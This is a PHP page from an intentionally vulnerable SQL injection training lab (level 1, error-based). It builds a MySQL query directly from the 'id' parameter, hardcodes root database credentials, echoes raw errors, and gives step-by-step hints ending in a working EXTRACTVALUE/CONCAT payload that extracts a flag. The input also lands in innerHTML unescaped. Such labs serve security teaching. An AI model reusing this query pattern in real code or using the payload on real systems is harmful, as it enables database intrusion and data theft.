<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 1 - Error Based SQLi</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚨 Level 1 - Error Based Injection</h1>
            <p><strong>Objective:</strong> Extract data by triggering database errors that reveal sensitive information</p>
        </div>

        <div class="form-container">
            <h3>🔍 Current Query:</h3>
            <div class="code-block">SELECT id, username FROM users WHERE id = <?php echo htmlspecialchars($_GET['id'] ?? 'NULL'); ?></div>
            
            <?php
            if (isset($_GET['id'])) {
                echo '<h3>📊 Result:</h3>';
                echo '<div class="result">';
                
                $mysqli = new mysqli('db','root','rootpassword','sqli_lab');
                $id = $_GET['id'];
                $sql = "SELECT id, username FROM users WHERE id = $id";
                if ($res = $mysqli->query($sql)) {
                    if ($res->num_rows > 0) {
                        while ($row = $res->fetch_row()) {
                            echo '<strong>ID:</strong> ' . htmlspecialchars($row[0]) . ' - <strong>Username:</strong> ' . htmlspecialchars($row[1]) . '<br>';
                        }
                    } else {
                        echo 'No results found';
                    }
                } else {
                    echo '<div class="error">❌ Error: '.$mysqli->error.'</div>';
                }
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Payload:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="id">ID Parameter:</label>
                    <input type="text" id="id" name="id" value="<?php echo htmlspecialchars($_GET['id'] ?? ''); ?>" placeholder="Enter your payload here..." oninput="updateQuery()">
                </div>
                <button type="submit" class="btn">🚀 Execute Query</button>
            </form>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding the Query</h4>
                    <p><strong>Original Query:</strong> <code>SELECT id, username FROM users WHERE id = [YOUR_INPUT]</code></p>
                    <p>📝 <strong>First Step:</strong> Try entering the number <code>1</code> to see normal behavior.</p>
                    <p>🎯 <strong>Purpose:</strong> Observe how the query works with valid data.</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: Breaking the Query</h4>
                    <p><strong>Concept:</strong> Error-based SQLi relies on creating meaningful errors.</p>
                    <p>📝 <strong>Test:</strong> <code>1'</code> - Add a single quote to break the syntax</p>
                    <p>🎯 <strong>Expected Result:</strong> MySQL syntax error message</p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Error-Based Functions</h4>
                    <p><strong>MySQL has special functions:</strong></p>
                    <p>• <code>EXTRACTVALUE()</code> - Extracts values from XML</p>
                    <p>• <code>UPDATEXML()</code> - Updates XML documents</p>
                    <p>📝 <strong>Test:</strong> <code>1 AND EXTRACTVALUE(1, 'test')</code></p>
                    <p>🎯 <strong>Explanation:</strong> This function will error when XPath is invalid</p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: Combining Data</h4>
                    <p><strong>Using CONCAT():</strong> Combine special characters with data</p>
                    <p>📝 <strong>Tilde character (~):</strong> <code>0x7e</code> = '~' (helps format output)</p>
                    <p>🔍 <strong>Test:</strong> <code>1 AND EXTRACTVALUE(1, CONCAT(0x7e, 'TEST', 0x7e))</code></p>
                    <p>🎯 <strong>Result:</strong> Error will display '~TEST~' in the message</p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>🎯 Hint 5: FINAL PAYLOAD</h4>
                    <p><strong>🚀 Get flag from levels table:</strong></p>
                    <p><code>1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT flag FROM levels WHERE id=1), 0x7e))</code></p>
                    <p><strong>📋 Payload Explanation:</strong></p>
                    <p>• <code>1 AND</code> - True condition to run the query</p>
                    <p>• <code>EXTRACTVALUE(1, ...)</code> - Function that creates error</p>
                    <p>• <code>CONCAT(0x7e, ..., 0x7e)</code> - Combine with ~ for easy identification</p>
                    <p>• <code>(SELECT flag FROM levels WHERE id=1)</code> - Subquery to get flag</p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="index.php">🏠 Home</a>
            <a href="level2.php">➡️ Next Level</a>
            <a href="submit.php?level=1">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 5;

    function updateQuery() {
        const input = document.getElementById('id').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = 'SELECT id, username FROM users WHERE id = ' + (input || 'NULL');
    }

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint >= maxHints) {
                document.querySelector('.hint-btn').textContent = '✅ All hints viewed';
                document.querySelector('.hint-btn').disabled = true;
                document.querySelector('.hint-btn').style.opacity = '0.6';
            } else {
                document.querySelector('.hint-btn').textContent = `💡 Next Hint (${currentHint}/${maxHints})`;
            }
        }
    }
    </script>
</body>
</html>